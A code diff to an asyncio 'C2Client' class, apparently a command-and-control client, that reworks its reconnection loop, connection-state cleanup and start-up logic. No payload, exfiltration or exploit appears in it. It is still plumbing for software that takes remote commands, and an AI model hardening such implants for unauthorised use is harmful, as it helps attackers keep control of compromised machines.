@@ -120,9 +120,9 @@ class C2Client:
                     await asyncio.sleep(reconnect_delay)
                     
                     if await self.connect():
+                        logger.info(f"Connected successfully {self.client_id}")
                         reconnect_delay = 5
-                        # Restart main loop
-                        await self.main_loop()
+                        return  # Exit reconnect loop, let start() handle main_loop
                     else:
                         reconnect_delay = min(reconnect_delay * 1.5, max_delay)
                 else:
@@ -152,6 +152,11 @@ class C2Client:
             logger.info("Client canceling tasks")
             for task in tasks:
                 task.cancel()
+            # Clear connection state to trigger reconnection
+            if self.writer:
+                self.writer.close()
+            self.reader = None
+            self.writer = None
     
     async def _command_listener(self):
         """
@@ -197,7 +202,6 @@ class C2Client:
         while self.running:
             try:
                 # Get command with timeout
-                logger.info("Waiting for command in _command_processor")
                 cmd_data = await asyncio.wait_for(self.command_queue.get(), timeout=1.0)
                 
                 cmd_id = cmd_data.get("cmd_id")
@@ -287,16 +291,11 @@ class C2Client:
         """Start the C2 client"""
         logger.info(f"Starting C2 client (ID: {self.client_id})")
         
-        # Try initial connection
-        if await self.connect():
-            # Start main loop and reconnect loop
-            await asyncio.gather(
-                self.reconnect_loop(),
-                self.main_loop()
-            )
-        else:
-            logger.error("Failed to connect, starting reconnect loop")
-            await self.reconnect_loop()
+        # Start with reconnect loop - it handles both initial connection and reconnections
+        while self.running:
+            await self.connect() or await self.reconnect_loop()
+            if self.reader and self.writer:
+                await self.main_loop()
 
 # ==================== MAIN ====================
 
